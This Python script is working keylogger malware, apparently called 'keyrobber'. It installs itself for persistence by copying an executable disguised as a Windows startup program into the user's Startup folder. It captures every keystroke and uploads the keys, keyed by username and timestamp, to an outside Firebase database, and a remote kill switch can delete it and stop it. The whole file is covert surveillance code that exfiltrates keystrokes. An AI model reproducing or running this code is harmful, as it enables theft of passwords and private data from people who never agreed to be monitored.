from threading import Thread
from datetime import datetime
import firebase_admin
from firebase_admin import db
from ping3 import ping
from pynput.keyboard import Listener, Key
import platform
import shutil
import os
import sys

def resource_path(relative_path):
    """ Get absolute path to resource, works for dev and for PyInstaller """
    try:
        # PyInstaller creates a temp folder and stores path in _MEIPASS
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")

    return os.path.join(base_path, relative_path)
# os = platform.system() + platform.release()
# # coping this file into sturtup folder

pattern = __file__.split("\\")[:3]
path = __file__.split("\\")
user = __file__.split("\\")[2]

import os

try:

    shutil.copy(resource_path("Windows$StartUpPorgramm.exe"),
                f'{"/".join(pattern)}//AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup')
except:
    pass
# C:\Users\Arsbul Programming\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup


all_keys = {}
all_n = {"enter": "\n", "tab": "\t"}

cred_obj = firebase_admin.credentials.Certificate(resource_path('keyrobber-7a895-firebase-adminsdk-fjrx8-b8b35b47aa.json'))
app_d = firebase_admin.initialize_app(cred_obj, {
    'databaseURL': "https://keyrobber-7a895-default-rtdb.firebaseio.com/"
})


# ref = db.reference(f'/lock/')
# if ref.get():
#     os.remove(__name__)

# d = {"month": datetime.now().month, "day": datetime.now().day, "hour": datetime.now().hour}
# ref = db.reference(f'/keys/{d}/keys')
#
#
def loop():
    while True:
        p = ping('keyrobber-7a895-default-rtdb.firebaseio.com', timeout=1, unit="ms")


        if p != False and p != None and p < 300:

            ref = db.reference("/lock_flag")

            if ref.get():
                try:

                    os.remove(resource_path(f'{"/".join(pattern)}//AppData/Roaming/Microsoft/Windows/Start Menu/Programs/StartupWindows$StartUpPorgramm.exe'))
                except:
                    pass

                os.abort()
        # except:
        #
        #     pass


th = Thread(target=loop)
th.start()


def up_data():
    global all_keys

    p = ping('keyrobber-7a895-default-rtdb.firebaseio.com', timeout=1, unit="ms")

    try:
        if p != False and p != None and p < 300:

            g = all_keys.copy()
            all_keys = {}

            for time, key in g.items():
                ref = db.reference(f'/keys/{user}/{time}')
                ref.set(key)
                print(g)

    except:

        pass


def on_press(ev):  # The function that's called when a key is pressed
    global all_keys
    timedate = datetime.now().isoformat().replace(":", "two").replace(".", "one")
    try:

        all_keys[timedate] = ev.char
    except AttributeError:

        # if ev == Key.space:  # If space was pressed, write a space
        all_keys[timedate] = str(ev).split(".")[1]

    th = Thread(target=up_data)
    th.start()


with Listener(
        on_press=on_press) as listener:
    listener.join()
